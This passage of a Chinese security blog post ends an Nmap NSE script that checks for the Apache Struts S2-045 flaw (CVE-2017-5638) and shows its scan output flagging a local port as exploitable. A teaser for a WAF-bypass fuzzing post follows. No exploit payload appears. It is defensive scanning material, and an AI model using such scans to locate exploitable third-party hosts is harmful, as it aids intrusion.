      <span class="n">IDS</span> <span class="o">=</span> <span class="p">{</span><span class="n">CVE</span> <span class="o">=</span> <span class="s1">'CVE-2017-5638'</span><span class="p">},</span>
      <span class="n">references</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638'</span><span class="p">,</span>
        <span class="s1">'http://www.cnvd.org.cn/flaw/show/CNVD-2017-02474'</span>
      <span class="p">},</span>
      <span class="n">dates</span> <span class="o">=</span> <span class="p">{</span>
        <span class="n">disclosure</span> <span class="o">=</span> <span class="p">{</span><span class="n">year</span> <span class="o">=</span> <span class="s1">'2017'</span><span class="p">,</span> <span class="n">month</span> <span class="o">=</span> <span class="s1">'03'</span><span class="p">,</span> <span class="n">day</span> <span class="o">=</span> <span class="s1">'07'</span><span class="p">},</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">stdnse</span><span class="p">.</span><span class="n">debug1</span><span class="p">(</span><span class="s2">"There is a vulnerability in the current host"</span><span class="p">)</span>
    <span class="n">vuln</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">vulns</span><span class="p">.</span><span class="n">STATE</span><span class="p">.</span><span class="n">EXPLOIT</span>
    <span class="k">return</span> <span class="n">vuln_report</span><span class="p">:</span><span class="n">make_output</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span>
  <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>
在portrule 绑定的规则中可以自定义扫描规则来决定是否进行扫描

下面我们开启debug模式看看扫描结果：

<code class="highlighter-rouge">nmap --script /home/liyingzhe/PycharmProjects/untitled/struts.nse 127.0.0.1 -d</code>

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-03/0x02.png" alt="0x02" />

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-03/0x03.png" alt="0x03" />

关闭调试模式的扫描结果：
<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-03/0x04.png" alt="0x04" />
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>liyingzhe : /usr/share/nmap $nmap --script /home/liyingzhe/PycharmProjects/untitled/struts.nse 127.0.0.1

Starting Nmap 7.01 ( https://nmap.org ) at 2017-06-03 03:09 CST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000051s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
80/tcp   open  http
631/tcp  open  ipp
1080/tcp open  socks
|_struts: ERROR: Script execution failed (use -d to debug)
3306/tcp open  mysql
|_struts: ERROR: Script execution failed (use -d to debug)
8899/tcp open  ospf-lite
| struts: 
|   VULNERABLE:
|   Struts S2-045
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2017-5638
|       The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 mishandles file upload, which allows remote attackers to execute arbitrary commands via a #cmd= string in a crafted Content-Type HTTP header, as exploited in the wild in March 2017.
|
|     Disclosure date: 2017-03-07
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
|       http://www.cnvd.org.cn/flaw/show/CNVD-2017-02474
|_      http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638

Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds
liyingzhe : /usr/share/nmap $
</code></pre></div></div>
PS：本文为一叶知安首发，作者：倾旋。未经授权请勿转载。

如果你想了解更多或者想加入我们的读者群，可以加我的微信：<code class="highlighter-rouge">Guest_Killer_0nlis</code>。


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Friday, June 2, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        nmap &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-06-02/1" > Fuzz 测试 WAF</a>
    </div>
    <div class="post-excerpt">
      本篇文章是总结 科拉实验室V1n3r的Fuzz bypass WAF的过程，由科拉实验室 倾旋 做内容补充。
<!--more-->
<h2 id="0x00-前言">0x00 前言</h2>
科拉实验室 是一个无名无实的信息安全实验室，此Git用于发布成员研究成果，技术交流而创。


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Friday, June 2, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        fuzz &nbsp;
        
      </span>
    </div>
  </div>
  
  </div>
</section>



</section>
<!-- 
<nav class="navbar navbar-default navbar-fixed-bottom">
  <div class="container footer-content">
    Jekyll Theme by Hemang Kumar/Powered By Jekyll/Site owner is 倾旋
  </div>
</nav>
-->
<script src="https://s22.cnzz.com/z_stat.php?id=1262492389&web_id=1262492389" language="JavaScript"></script>
  </body>

</html>
